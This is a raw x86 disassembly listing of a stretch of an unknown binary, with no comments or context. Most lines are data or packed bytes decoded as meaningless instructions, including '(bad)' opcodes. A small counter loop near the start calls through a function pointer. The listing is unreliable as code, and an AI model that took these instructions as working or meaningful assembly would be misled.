  41dad2:	dec    ebp
  41dad3:	call   0xe8b3:0xeaf8ee94
  41dada:	fisubr WORD PTR [esi]
  41dadc:	adc    DWORD PTR [edx+edx*8+0x9],esp
  41dae0:	pop    es
  41dae1:	and    eax,0xa61a8adb
  41dae6:	pop    ss
  41dae7:	jmp    0x41daf8
  41dae9:	int    0x2d
  41daeb:	test   eax,0xa5afe440
  41daf0:	mov    ebx,0xf87666e6
  41daf5:	cmc    
  41daf6:	mov    ebp,DWORD PTR [ecx-0x76]
  41daf9:	xchg   ebp,eax
  41dafa:	leave  
  41dafb:	int3   
  41dafc:	retf   0xb8fd
  41daff:	xor    esi,DWORD PTR [ecx]
  41db01:	mov    DWORD PTR [esi],edi
  41db03:	mov    ah,0x6b
  41db05:	dec    ebx
  41db06:	sbb    al,0x8d
  41db08:	ja     0x41db04
  41db0a:	out    dx,eax
  41db0b:	xchg   ecx,eax
  41db0c:	push   esp
  41db0d:	add    al,0xc1
  41db0f:	sti    
  41db10:	and    BYTE PTR [ebp-0x5669d119],al
  41db16:	cli    
  41db17:	dec    si
  41db19:	fiadd  WORD PTR [ebx]
  41db1b:	clc    
  41db1c:	mov    cl,0xb8
  41db1e:	xlat   BYTE PTR ds:[ebx]
  41db1f:	(bad)  
  41db20:	jbe    0x41dad5
  41db22:	xchg   esi,eax
  41db23:	test   esp,ebp
  41db25:	les    ebp,FWORD PTR [edx+0x23]
  41db28:	push   0xfffffff2
  41db2a:	lahf   
  41db2b:	inc    esi
  41db2c:	div    ch
  41db2e:	push   esi
  41db2f:	popa   
  41db30:	loop   0x41dae2
  41db32:	jb     0x41dae1
  41db34:	sbb    edx,DWORD PTR [ecx+eiz*4-0x70]
  41db38:	clc    
  41db39:	or     BYTE PTR [ecx+0x4a],dl
  41db3c:	inc    ecx
  41db3d:	or     ebx,DWORD PTR [eax]
  41db3f:	loope  0x41db92
  41db41:	lds    ecx,FWORD PTR [esi+0x4b]
  41db44:	idiv   BYTE PTR [ebx+0x25]
  41db47:	shl    esp,0x25
  41db4a:	jge    0x41db8c
  41db4c:	cld    
  41db4d:	add    edi,DWORD PTR [edi+0xf8c3b30]
  41db53:	cmp    bl,BYTE PTR [ebx]
  41db55:	push   ebp
  41db56:	sahf   
  41db57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db59:	test   al,0x60
  41db5b:	loop   0x41db11
  41db5d:	mov    esi,0xccea0202
  41db62:	mov    edx,DWORD PTR [ebp-0x2c]
  41db65:	and    DWORD PTR ds:0x42a34d,0x0
  41db6f:	jmp    0x41db83
  41db74:	xor    ebx,ebx
  41db76:	add    ebx,DWORD PTR ds:0x42a34d
  41db7c:	inc    ebx
  41db7d:	mov    DWORD PTR ds:0x42a34d,ebx
  41db83:	cmp    DWORD PTR ds:0x42a34d,0x14
  41db8a:	jae    0x41dbbf
  41db90:	cmp    DWORD PTR ds:0x42a34d,0x16
  41db97:	jne    0x41dbac
  41db9d:	push   DWORD PTR [ebp-0x10]
  41dba0:	push   DWORD PTR [ebp-0x18]
  41dba3:	push   DWORD PTR [ebp-0x18]
  41dba6:	call   DWORD PTR ds:0x425358
  41dbac:	jmp    0x41db74
  41dbb1:	mov    edi,DWORD PTR ds:0x42a359
  41dbb7:	mov    edi,DWORD PTR [edi]
  41dbb9:	sub    DWORD PTR ds:0x42a2e1,edi
  41dbbf:	mov    edi,DWORD PTR [ebp-0x4]
  41dbc2:	jmp    0x41e0d4
  41dbc7:	retf   0xd1c8
  41dbca:	into   
  41dbcb:	(bad)  
  41dbcd:	leave  
  41dbce:	aam    0xa0
  41dbd0:	cmp    ah,dl
  41dbd2:	or     DWORD PTR [edx-0xa0bedc2],0x73787fb1
  41dbdc:	jl     0x41dc56
  41dbde:	js     0x41dbb5
  41dbe0:	pop    ds
  41dbe1:	lds    eax,FWORD PTR [edx+0x50]
  41dbe4:	and    bh,BYTE PTR ds:0x744e928b
  41dbea:	cmp    al,0xaf
  41dbec:	push   0x515009e7
  41dbf1:	outs   dx,BYTE PTR ds:[esi]
  41dbf2:	dec    ecx
  41dbf3:	inc    eax
  41dbf4:	call   0xf3cf:0x54a7a0fc
  41dbfb:	xchg   ecx,eax
  41dbfc:	ins    BYTE PTR es:[edi],dx
  41dbfd:	retf   0xa29b
  41dc00:	je     0x41dbfd
  41dc02:	mov    dh,0xcd
  41dc04:	jecxz  0x41dbe5
  41dc06:	cmp    ch,BYTE PTR [eax+0x4d9074ee]
  41dc0c:	retf   
  41dc0d:	and    eax,0x81846e65
  41dc12:	jp     0x41dc44
  41dc14:	xchg   esi,eax
  41dc15:	leave  
  41dc16:	push   es
  41dc17:	mov    eax,ds:0xb82a563f
  41dc1c:	xor    cl,bh
  41dc1e:	sti    
  41dc1f:	adc    BYTE PTR [eax],dl
  41dc21:	fmul   QWORD PTR [esi-0x5f6921e6]
  41dc27:	into   
  41dc28:	pop    eax
  41dc29:	ja     0x41dc4d
  41dc2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc2c:	js     0x41dc53
  41dc2e:	pop    edi
  41dc2f:	xor    eax,0x8dd3720f
  41dc34:	js     0x41dc3d
  41dc36:	repz es mov bh,0xf3
  41dc3a:	sbb    BYTE PTR [ecx],ah
  41dc3c:	or     DWORD PTR [ecx+0x2bea67c],edi
  41dc42:	fisttp DWORD PTR [esi+0x304772bb]
  41dc48:	add    ebx,DWORD PTR [eax]
  41dc4a:	and    cl,BYTE PTR [edi-0x756f7123]
  41dc50:	bound  ebp,QWORD PTR [ecx-0x6840ecfb]
  41dc56:	aam    0xbf
  41dc58:	in     eax,dx
  41dc59:	xchg   edx,eax
  41dc5a:	add    BYTE PTR [edi+0x46],ah
  41dc5d:	adc    eax,0x4c7b71b
  41dc62:	push   ebx
  41dc63:	shl    BYTE PTR [ecx-0x338d1c2b],1
  41dc69:	enter  0x9031,0xa0
  41dc6d:	add    al,ch
  41dc6f:	mov    ch,0xb3
  41dc71:	call   0xb7d4d556
  41dc76:	sub    DWORD PTR [edx],edi
  41dc78:	or     DWORD PTR [edx+0x15],eax
  41dc7b:	mov    ecx,0x28c606e1
  41dc80:	imul   edi,DWORD PTR [ecx-0x5c492edb],0x2a
  41dc87:	iret   
  41dc88:	mov    eax,DWORD PTR [edi]
  41dc8a:	fisubr DWORD PTR [ebx-0x4]
  41dc8d:	sub    eax,0x90487980
  41dc92:	pop    ebx
  41dc93:	sbb    bh,bh
  41dc95:	cmp    al,0x48
  41dc97:	adc    al,0xa1
  41dc99:	adc    BYTE PTR [ecx+0x6e5d24e1],bl
  41dc9f:	mov    cl,0xa5
  41dca1:	adc    dh,ch
  41dca3:	pusha  
  41dca4:	dec    esi
  41dca5:	push   0x1cc159ed
  41dcaa:	xchg   ecx,eax
  41dcab:	rcl    DWORD PTR [edi+0x32dcae03],0x17
  41dcb2:	lock unpckhps xmm7,xmm5
  41dcb6:	call   0x6a8e:0xcc8e7750
  41dcbd:	fcomp  QWORD PTR [esi-0x61]
  41dcc0:	inc    edx
  41dcc1:	pop    eax
  41dcc2:	or     edx,DWORD PTR cs:[esi]
  41dcc5:	mov    al,ds:0x80990559
  41dcca:	int3   
  41dccb:	mov    ebx,0xacba73dc
  41dcd0:	scas   eax,DWORD PTR es:[edi]
  41dcd1:	scas   al,BYTE PTR es:[edi]
  41dcd2:	lock imul edx,DWORD PTR [esi-0x5813f136],0xdb0f7309
  41dcdd:	inc    edx
  41dcde:	sub    ch,BYTE PTR [ebx-0x77]
  41dce1:	test   BYTE PTR [esi-0x7434e877],ah
  41dce7:	jl     0x41dc8c
  41dce9:	std    
  41dcea:	jno    0x41dc92
  41dcec:	mov    ds:0x1fd2115d,eax
  41dcf1:	mov    cl,0x9
  41dcf3:	(bad)  
  41dcf4:	call   0x43a01ea3
  41dcf9:	pop    ds
  41dcfa:	mov    ss,WORD PTR [eax]
  41dcfc:	loopne 0x41dd10
  41dcfe:	inc    esi
  41dcff:	jl     0x41dcda
  41dd01:	inc    ecx
  41dd02:	dec    ebx
  41dd03:	pop    edi
  41dd04:	or     BYTE PTR [esi+esi*1+0x4c4b4be2],cl
  41dd0b:	loopne 0x41dd51
  41dd0d:	mov    edi,0xf25d152f
  41dd12:	rcr    esi,0x78
  41dd15:	stos   DWORD PTR es:[edi],eax
  41dd16:	ret    
  41dd17:	in     al,0xb9
  41dd19:	inc    eax
  41dd1a:	fs xor eax,0xa894be98
  41dd20:	outs   dx,BYTE PTR ds:[esi]
  41dd21:	icebp  
  41dd22:	pop    DWORD PTR [edx+0x29]
  41dd25:	imul   ecx,DWORD PTR [edx],0x51
  41dd28:	mov    bh,0x4c
  41dd2a:	je     0x41dce6
  41dd2c:	jb     0x41dd31
  41dd2e:	jne    0x41dda0
  41dd30:	mov    eax,ds:0x2b1440ff
  41dd35:	imul   ebp,edx,0xffffffb4
  41dd38:	lods   al,BYTE PTR ds:[esi]
  41dd39:	out    dx,al
  41dd3a:	repz sahf 
  41dd3c:	fcomp  QWORD PTR [edx-0x2ca853be]
  41dd42:	or     DWORD PTR ss:[eax+0x482090d5],esp
  41dd49:	cmp    ebx,edx
  41dd4b:	mov    dh,0x4b
  41dd4d:	or     al,dh
  41dd4f:	push   0xbe5d8e73
  41dd54:	call   0xaa8f7c5e
  41dd59:	or     al,0x61
  41dd5b:	jmp    0xe92777bb
  41dd60:	ja     0x41ddda
  41dd62:	fmul   DWORD PTR [ecx-0x23]
  41dd65:	in     eax,dx
  41dd66:	dec    ecx
  41dd67:	shl    ah,0xfa
  41dd6a:	sub    BYTE PTR [edx-0x4532221c],cl
  41dd70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd71:	xchg   esp,eax
  41dd72:	or     ah,BYTE PTR [ecx-0x62]
  41dd75:	dec    esp
  41dd76:	lods   al,BYTE PTR ds:[esi]
  41dd77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd78:	cdq    
  41dd79:	inc    esi
  41dd7a:	xchg   BYTE PTR [edi+0x55f6672c],ah
  41dd80:	mov    al,0x44
  41dd82:	pop    ds
  41dd83:	test   edi,ecx
  41dd85:	out    dx,eax
  41dd86:	lods   eax,DWORD PTR ds:[esi]
  41dd87:	xchg   edi,eax
  41dd88:	scas   eax,DWORD PTR es:[edi]
  41dd89:	adc    dh,BYTE PTR ds:[ebx-0x355c6e46]
  41dd90:	rcr    DWORD PTR [ecx],0xcf
  41dd93:	mov    ecx,0x18fe9a18
  41dd98:	daa    
  41dd99:	pop    DWORD PTR [edx]
  41dd9b:	jbe    0x41ddda
  41dd9d:	mov    ds:0x399605e8,al
  41dda2:	inc    ecx
  41dda3:	or     al,BYTE PTR [eax+0x5b]
  41dda6:	jg     0x41dd35
  41dda8:	jl     0x41dd92
  41ddaa:	add    eax,0x91a58ae1
  41ddaf:	aad    0x30
  41ddb1:	stos   BYTE PTR es:[edi],al
  41ddb2:	rcr    BYTE PTR [eax+0x792cf496],cl
  41ddb8:	test   eax,0x9fd11544
  41ddbd:	frstor [edx]
  41ddbf:	push   ecx
  41ddc0:	sbb    al,0xb7
  41ddc2:	inc    edi
  41ddc3:	fadd   QWORD PTR [eax+0x6a7706c8]
  41ddc9:	xchg   BYTE PTR [ecx+edx*2],bl
  41ddcc:	stc    
  41ddcd:	div    ah
  41ddcf:	inc    esp
  41ddd0:	mov    ebx,0xe4b5d86e
  41ddd5:	mov    ebx,0x9cec7f60
  41ddda:	mov    eax,ds:0x1922c6f7
  41dddf:	xchg   ecx,eax
  41dde0:	test   DWORD PTR [ebx],ebx
  41dde2:	daa    
  41dde3:	xor    BYTE PTR [ebp+0x74d93b38],bh
  41dde9:	out    dx,eax
  41ddea:	mov    eax,ds:0xc0910845
  41ddef:	add    al,0x74
  41ddf1:	xlat   BYTE PTR ds:[ebx]
  41ddf2:	adc    bh,BYTE PTR [eax+0x6b]
  41ddf5:	mov    DWORD PTR [edi+0xf],ecx
  41ddf8:	pop    es
  41ddf9:	xlat   BYTE PTR ds:[ebx]
  41ddfa:	cmp    al,0xd0
  41ddfc:	or     eax,0x1192d031
  41de01:	xchg   ecx,eax
  41de02:	fdiv   QWORD PTR [ebx-0x770e9818]
  41de08:	dec    edx
  41de09:	fcomp  DWORD PTR [ebp-0x26]
  41de0c:	jge    0x41dde0
  41de0e:	push   ds
  41de0f:	mov    esp,0x223e1888
  41de14:	lods   al,BYTE PTR ds:[esi]
  41de15:	push   ebp
  41de16:	popf   
  41de17:	mov    dh,0xd7
  41de19:	je     0x41ddbb
  41de1b:	jp     0x41ddb0
  41de1d:	pop    ss
  41de1e:	cdq    
  41de1f:	pop    ds
  41de20:	arpl   bx,si
  41de22:	push   0xffffffa5
  41de24:	outs   dx,BYTE PTR ds:[esi]
  41de25:	inc    edi
  41de26:	mov    edx,edx
  41de28:	ss xchg ebp,eax
  41de2a:	mov    dh,0x38
  41de2c:	adc    eax,0x2629c642
  41de31:	pop    ebp
  41de32:	in     eax,0xdc
  41de34:	leave  
  41de35:	enter  0xf3c7,0x12
  41de39:	inc    edx
  41de3a:	test   eax,0xa73c15f5
  41de3f:	aas    
  41de40:	loopne 0x41de56
  41de42:	dec    edi
  41de43:	jns    0x41de32
  41de45:	shl    BYTE PTR ds:0x9938fd18,0x20
  41de4c:	mov    DWORD PTR [ebp+eax*8-0x7286ee8e],eax
  41de53:	push   ebp
  41de54:	mov    bh,0xa2
  41de56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de57:	or     al,0x27
  41de59:	(bad)  
  41de5a:	fcomp  DWORD PTR [esi+0x91eb255]
  41de60:	cmp    dl,bl
  41de62:	sub    BYTE PTR [esi-0x38f90cd1],bh
  41de68:	inc    edi
  41de69:	std    
  41de6a:	js     0x41ddef
  41de6c:	pop    ss
  41de6d:	es adc ebx,ebx
  41de70:	shl    esp,cl
  41de72:	xchg   ebx,eax
  41de73:	and    DWORD PTR [ecx-0x478d0dac],ecx
  41de79:	and    BYTE PTR [edx-0xb29fd87],cl
  41de7f:	jae    0x41decf
  41de81:	retf   0xd81f
  41de84:	aam    0x5e
  41de86:	add    esp,edi
  41de88:	push   ebx
  41de89:	add    al,0x1e
  41de8b:	jge    0x41deca
  41de8d:	pop    ebp
  41de8e:	mov    ebx,0x381fe9ad
  41de93:	jmp    0x41de7e
  41de95:	mul    BYTE PTR [edx-0x6ed28d3a]
  41de9b:	mov    eax,0x9573f29e
  41dea0:	xchg   DWORD PTR [edi],esi
  41dea2:	loop   0x41de7a
  41dea4:	jne    0x41dea4
  41dea6:	and    BYTE PTR [ebx+ecx*4+0x2c],al
  41deaa:	cmp    ebx,DWORD PTR [esi]
  41deac:	dec    ebp
  41dead:	sbb    ah,bl
  41deaf:	adc    esi,ebp
  41deb1:	jg     0x41deb5
  41deb3:	cmp    DWORD PTR [ebp-0x285db673],edx
  41deb9:	mov    es,WORD PTR [esi-0x668cc837]
  41debf:	mov    ah,0xdc
  41dec1:	cmp    BYTE PTR [esi],al
  41dec3:	mov    esp,0xd81a6f5d
  41dec8:	jg     0x41dec6
  41deca:	or     BYTE PTR [eax+0x4b],bl
  41decd:	shl    esi,0x6e
  41ded0:	sub    dh,ah
  41ded2:	mov    edi,0x8feb97b8
  41ded7:	mov    ebp,0xd77a29b1
  41dedc:	sub    DWORD PTR [ecx+eax*2-0x11],0xfffffffd
  41dee1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dee2:	outs   dx,DWORD PTR ds:[esi]
  41dee3:	push   edi
  41dee4:	xchg   BYTE PTR [ebx+0x6fdfb42b],bl
  41deea:	push   0xffffff89
  41deec:	and    DWORD PTR [ecx],eax
  41deee:	iret   
  41deef:	jnp    0x41deda
  41def1:	retf   
  41def2:	adc    al,0x5c
  41def4:	dec    esi
  41def5:	pop    esi
  41def6:	mov    cl,BYTE PTR ds:0x305ad514
  41defc:	push   0x23
  41defe:	sbb    al,0x71
  41df00:	jp     0x41dee1
  41df02:	retf   
  41df03:	jmp    0x9de3:0xaa688bf4
  41df0a:	retf   
  41df0b:	(bad)  
  41df0c:	imul   edx,DWORD PTR [eax],0xffffffc4
  41df0f:	mov    bh,0xdc
  41df11:	sbb    al,bh
  41df13:	sbb    dh,BYTE PTR [edx+0x41a2f21b]
  41df19:	dec    eax
  41df1a:	dec    ebx
  41df1b:	sub    edx,DWORD PTR [edi+0x7649aac5]
  41df21:	sti    
  41df22:	test   DWORD PTR [ebp-0x6de242c8],0xfe2ecba6
  41df2c:	inc    ebx
  41df2d:	adc    BYTE PTR [ecx+esi*1+0x5fcdfc3d],0x3e
  41df35:	mov    ebx,?
  41df37:	out    dx,al
  41df38:	dec    ecx
  41df39:	pusha  
  41df3a:	mov    esp,0x958ac191
  41df3f:	mov    al,ds:0x9a5a7fa0
  41df44:	ins    DWORD PTR es:[edi],dx
  41df45:	icebp  
  41df46:	and    BYTE PTR [ebx-0x2f1accf1],dl
  41df4c:	pop    es
  41df4d:	loopne 0x41df10
  41df4f:	rcl    dl,1
  41df51:	xchg   DWORD PTR [eax],ecx
  41df53:	aas    
  41df54:	ins    DWORD PTR es:[edi],dx
  41df55:	mov    ch,al
  41df57:	mov    es,WORD PTR [ebx+edi*1-0x69]
  41df5b:	lds    ebx,FWORD PTR [esi-0x35]
  41df5e:	out    dx,eax
  41df5f:	lea    ecx,[esi-0x67]
  41df62:	xchg   BYTE PTR [ebx],bh
  41df64:	inc    ebx
  41df65:	adc    ah,dl
  41df67:	(bad)  
  41df68:	fimul  WORD PTR [esi+0x2b86a96f]
  41df6e:	pop    ebp
  41df6f:	call   0x10e234e1
  41df74:	lahf   
  41df75:	pop    ss
  41df76:	enter  0x21c3,0x9d
  41df7a:	mov    edx,0x6adc62b
  41df7f:	xor    dh,BYTE PTR [esi]
  41df81:	pop    es
  41df82:	out    dx,eax
  41df83:	loop   0x41dfb7
  41df85:	imul   ecx,DWORD PTR [ecx-0x52],0xffffffbc
  41df89:	jg     0x41df0e
  41df8b:	dec    edx
  41df8c:	adc    DWORD PTR [ebx-0x2bfc240c],ebx
  41df92:	repnz gs push ds
  41df95:	xor    DWORD PTR [ebx-0x587d98cc],edx
  41df9b:	xor    bh,dl
  41df9d:	mov    DWORD PTR [ecx+0xb858a0c],0x2e36f260
  41dfa7:	inc    edi
  41dfa8:	cli    
  41dfa9:	dec    edi
  41dfaa:	mov    dh,0x36
  41dfac:	out    dx,al
  41dfad:	jmp    0x73c8:0xa7abc51e
  41dfb4:	xor    al,0x3d
  41dfb6:	inc    ecx
  41dfb7:	sar    DWORD PTR [esi+0x79c379ef],1
  41dfbd:	pushf  
  41dfbe:	push   esp
  41dfbf:	cmp    al,0x23
  41dfc1:	or     ah,BYTE PTR [ecx+0x1e1a0f7b]
  41dfc7:	push   ds
  41dfc8:	retf   
  41dfc9:	lds    esp,FWORD PTR [edi+0x1de20d0]
  41dfcf:	jge    0x41dfe8
  41dfd1:	in     al,dx
  41dfd2:	inc    eax
  41dfd3:	xor    ebx,edx
  41dfd5:	and    bl,BYTE PTR [ebp+0x73b59f7]
  41dfdb:	mov    ds:0x88999b06,eax
  41dfe0:	sbb    al,0xf5
  41dfe2:	sbb    BYTE PTR [ecx],dl
  41dfe4:	loop   0x41df98
  41dfe6:	aad    0x7f
  41dfe8:	xchg   ebx,eax
  41dfe9:	std    
  41dfea:	inc    esp
  41dfeb:	mov    al,0x80
  41dfed:	xor    esi,esp
  41dfef:	pop    esp
  41dff0:	xor    edi,ebx
  41dff2:	enter  0xeae2,0xc3
  41dff6:	retf   
  41dff7:	ja     0x41e054
  41dff9:	dec    edi
  41dffa:	ret    
  41dffb:	(bad)  
  41dffc:	iret   
  41dffd:	xor    bl,BYTE PTR [esi+0x23]
  41e000:	cmp    ah,ch
  41e002:	add    cl,dl
  41e004:	pop    edx
  41e005:	pop    edx
  41e006:	mov    ecx,0xd4ed6cf1
  41e00b:	clc    
  41e00c:	iret   
  41e00d:	mov    BYTE PTR [ebx],0x90
  41e010:	xor    BYTE PTR [edi+ebx*1-0x1aa83f14],bh
  41e017:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e018:	icebp  
  41e019:	add    al,0xe5
  41e01b:	dec    esp
  41e01c:	fst    QWORD PTR ds:0x5d2a8eff
  41e022:	lss    ebp,FWORD PTR [edx-0x4b]
  41e026:	mov    ah,0x9d
  41e028:	stos   DWORD PTR es:[edi],eax
  41e029:	lock mov al,0xe8
  41e02c:	imul   bp,WORD PTR [ecx+0x16],0x9ff3
  41e032:	cdq    
  41e033:	inc    edi
  41e034:	dec    esi
  41e035:	je     0x41dfd5
  41e037:	and    ah,BYTE PTR [ebx+0x7f]
  41e03a:	not    DWORD PTR [esi]
  41e03c:	iret   
  41e03d:	cli    
  41e03e:	pusha  
  41e03f:	not    DWORD PTR [eax+0x40]
  41e042:	fdivr  st(4),st
  41e044:	and    cl,BYTE PTR [esi]
  41e046:	mov    ch,0xdf
  41e048:	mov    ds:0xfe6c5669,al
  41e04d:	inc    eax
  41e04e:	mov    ds:0xf45788d7,eax
  41e053:	mov    ebp,0x168e7e0b
  41e058:	jge    0x41e085
  41e05a:	sub    al,bh
  41e05c:	inc    sp
  41e05e:	psubw  mm0,mm6
  41e061:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e062:	sub    DWORD PTR [ebp+0x62546938],ecx
  41e068:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e069:	(bad)  
  41e06a:	fisubr WORD PTR [esi]
  41e06c:	mov    esp,0x9663cdd3
  41e071:	sub    dh,BYTE PTR ss:[eax+0x3f8fe0cc]
  41e078:	xchg   BYTE PTR [esi+ebp*8-0x5bc8cc5e],bh
  41e07f:	pop    esi
  41e080:	sti    
  41e081:	push   es
  41e082:	xor    BYTE PTR [ebp-0x6b],0xeb
  41e086:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e087:	call   0x1fc3846a
  41e08c:	mov    ebx,0x55170b87
  41e091:	xor    ebx,DWORD PTR [edi+0x2c0d8b9e]
  41e097:	scas   eax,DWORD PTR es:[edi]
  41e098:	dec    ecx
  41e099:	pop    esi
  41e09a:	add    dh,BYTE PTR [edi-0x1]
  41e09d:	jae    0x41e0dd
  41e09f:	icebp  
  41e0a0:	sub    BYTE PTR [ebx+0x2d],0x9e
  41e0a4:	mov    esi,0x9c3ed807
  41e0a9:	and    al,0xb4
  41e0ab:	jb     0x7ce578c3
  41e0b1:	fnstsw WORD PTR [ebx+ebp*2-0x7f]
  41e0b5:	cld    
  41e0b6:	xchg   edx,eax
  41e0b7:	pop    edi
  41e0b8:	and    ch,al
  41e0ba:	push   ss
  41e0bb:	xchg   DWORD PTR [edi+0x56b088d4],edx
  41e0c1:	or     al,0x7b
  41e0c3:	arpl   WORD PTR [ebx+0x2f],sp
  41e0c6:	pop    ecx
  41e0c7:	xlat   BYTE PTR ds:[ebx]
  41e0c8:	cmp    al,BYTE PTR [edi]
  41e0ca:	call   ecx
  41e0cc:	fisttp QWORD PTR [edx]
  41e0ce:	retf   0x3a09
  41e0d1:	adc    al,0xd6
  41e0d3:	xor    al,0x33
  41e0d5:	shl    BYTE PTR [ebx],1
  41e0d7:	clc    
  41e0d8:	add    edi,ecx
  41e0da:	jmp    0x41e5ec
  41e0df:	cmp    al,0xc0
  41e0e1:	leave  
  41e0e2:	retf   
  41e0e3:	leave  
  41e0e4:	leave  
  41e0e5:	ret    0xc9c7
  41e0e8:	outs   dx,BYTE PTR ds:[esi]
  41e0e9:	retf   
  41e0ea:	jge    0x41e0ee
  41e0ec:	dec    esp
  41e0ed:	cli    
  41e0ee:	in     al,0xe8
  41e0f0:	mov    ah,0x7f
  41e0f2:	js     0x41e167
  41e0f4:	jl     0x41e16e
  41e0f6:	js     0x41e098
  41e0f8:	sbb    eax,0xc61340a2
  41e0fd:	lds    esi,FWORD PTR fs:[ebp+0x757472c0]
  41e104:	mov    ah,0xf0
  41e106:	xor    ch,BYTE PTR [ecx]
  41e108:	push   ecx
  41e109:	inc    eax
  41e10a:	outs   dx,BYTE PTR ds:[esi]
  41e10b:	jae    0x41e0e4
  41e10d:	xor    al,0xc4
  41e10f:	bswap  esi
  41e111:	aas    
  41e112:	out    0x7,al
  41e114:	and    al,0xa3
  41e116:	dec    ecx
  41e117:	icebp  
  41e118:	xchg   ebx,eax
  41e119:	mov    eax,ds:0x29656ac3
  41e11e:	pop    esi
  41e11f:	sub    DWORD PTR [edi-0x62dba31b],edi
  41e125:	inc    esi
  41e126:	pop    es
  41e127:	bound  eax,QWORD PTR ds:0x9992bfe2
  41e12d:	rcl    DWORD PTR [esi],0x4d
  41e130:	leave  
  41e131:	xchg   BYTE PTR [edi-0x5a60e99a],cl
  41e137:	push   cs
  41e138:	(bad)  
  41e139:	gs sub eax,0x90b65344
  41e13f:	fadd   DWORD PTR [edx+edx*1-0x4d]
  41e143:	rol    al,1
  41e145:	jge    0x41e101
  41e147:	xchg   cl,cl
  41e149:	addr16 pop ss
  41e14b:	into   
  41e14c:	xor    ch,BYTE PTR [esi-0xf4cd88f]
  41e152:	fs repz or DWORD PTR ds:[esi-0x4552c33e],edx
  41e15b:	imul   ebp,DWORD PTR [eax-0xfb246b2],0x51eb0dd3
  41e165:	adc    DWORD PTR [edx-0x67],ebx
  41e168:	fnstenv [edx+0x9]
  41e16b:	add    bl,al
  41e16d:	jnp    0x41e14d
  41e16f:	mov    cl,0x21
  41e171:	adc    esi,ecx
  41e173:	jge    0x41e153
  41e175:	jecxz  0x41e1da
  41e177:	imul   esi,edx,0x3
  41e17a:	enter  0xdbf,0xda
  41e17e:	shr    BYTE PTR [ebx-0x73],1
  41e181:	inc    ecx
  41e182:	test   BYTE PTR ds:[ebx+0x597d2e8b],ch
  41e189:	xor    DWORD PTR [bx+si],0xffffffcf
  41e18d:	popa   
  41e18e:	sub    DWORD PTR [edi-0x40ceb942],ecx
  41e194:	fwait
  41e195:	push   esi
  41e196:	pop    ebx
  41e197:	idiv   DWORD PTR [edi]
  41e199:	push   ds
  41e19a:	mov    ch,0x1c
  41e19c:	mov    ch,0x9e
  41e19e:	lds    ecx,FWORD PTR [ebx+0xd]
  41e1a1:	int    0x61
  41e1a3:	inc    esi
  41e1a4:	in     al,dx
  41e1a5:	jns    0x41e20e
  41e1a7:	mov    edx,DWORD PTR [ebx]
  41e1a9:	add    eax,0x68a266c3
  41e1ae:	hlt    
  41e1af:	stos   BYTE PTR es:[edi],al
  41e1b0:	jg     0x41e149
  41e1b2:	jmp    0x41e1ba
  41e1b4:	mov    bl,0xc0
  41e1b6:	sbb    eax,0xc10b2018
  41e1bb:	cmp    al,0x64
  41e1bd:	sbb    al,BYTE PTR [ecx-0x2a]
  41e1c0:	xchg   ah,dh
  41e1c2:	call   0xf809:0x45547c22
  41e1c9:	ja     0x41e1a8
  41e1cb:	out    0x8f,al
  41e1cd:	mov    bh,0x59
  41e1cf:	sbb    DWORD PTR [ecx],esi
  41e1d1:	push   cs
  41e1d2:	(bad)  
  41e1d4:	call   0xc30a3ae0
  41e1d9:	pop    ebp
  41e1da:	enter  0x2319,0x3
  41e1de:	and    bh,bl
  41e1e0:	xlat   BYTE PTR ds:[ebx]
  41e1e1:	jo     0x41e1fa
  41e1e3:	sbb    al,0x59
  41e1e5:	(bad)  
  41e1e6:	xchg   BYTE PTR ss:[ebp-0x39],bh
  41e1ea:	cmp    esp,DWORD PTR [ecx-0x43835839]
  41e1f0:	mov    eax,ds:0x440a3650
  41e1f5:	mov    WORD PTR [ecx+0x2a],ds
  41e1f8:	mov    cl,0x71
  41e1fa:	or     al,0xe8
  41e1fc:	push   eax
  41e1fd:	out    dx,eax
  41e1fe:	or     esp,esp
  41e200:	inc    ebp
  41e201:	or     esp,0x96430d9c
  41e207:	or     edx,DWORD PTR [ebp+0x3ebb33eb]
  41e20d:	mov    ah,0xfc
  41e20f:	fimul  WORD PTR [ebx-0x5]
  41e212:	fwait
  41e213:	or     DWORD PTR [esi+0x47],eax
  41e216:	les    esi,FWORD PTR [esi-0x47]
  41e219:	repz lahf 
  41e21b:	sbb    eax,0xea598648
  41e220:	inc    esp
  41e221:	rol    DWORD PTR [edi],cl
  41e223:	push   eax
  41e224:	mov    ah,0x91
  41e226:	push   0xca79ca20
  41e22b:	dec    ebp
  41e22c:	push   edx
  41e22d:	sbb    dl,BYTE PTR [eax+edi*4-0x8]
  41e231:	mov    ch,0x19
  41e233:	dec    ebp
  41e234:	sub    BYTE PTR [edi],ch
  41e236:	hlt    
  41e237:	and    al,0x2c
  41e239:	add    eax,0x653f7c3a
  41e23e:	push   cs
  41e23f:	js     0x41e256
  41e241:	push   esi
  41e242:	push   edi
  41e243:	inc    ebp
  41e244:	cwde   
  41e245:	and    al,0x19
  41e247:	(bad)  
  41e248:	ja     0x41e1e9
  41e24a:	add    eax,0xbf1e0b50
  41e24f:	adc    ch,ch
  41e251:	jle    0x41e220
  41e253:	adc    BYTE PTR [esi+edi*1+0x7e],dl
  41e257:	jno    0x41e2a1
  41e259:	inc    ecx
  41e25a:	daa    
  41e25b:	jns    0x41e278
  41e25d:	out    0x77,eax
  41e25f:	in     eax,dx
  41e260:	mov    BYTE PTR [ebx],dh
  41e262:	sysexit 
  41e264:	sbb    DWORD PTR gs:[eax],ecx
  41e267:	into   
  41e268:	jnp    0x41e298
  41e26a:	lahf   
  41e26b:	jl     0x41e25f
  41e26d:	xchg   edx,eax
  41e26e:	dec    ebx
  41e26f:	sbb    eax,0x9919bcd6
  41e274:	gs push eax
  41e276:	push   ds
  41e277:	xor    BYTE PTR [ecx],al
  41e279:	mov    eax,0x8bac80f8
  41e27e:	les    ebx,FWORD PTR [esi]
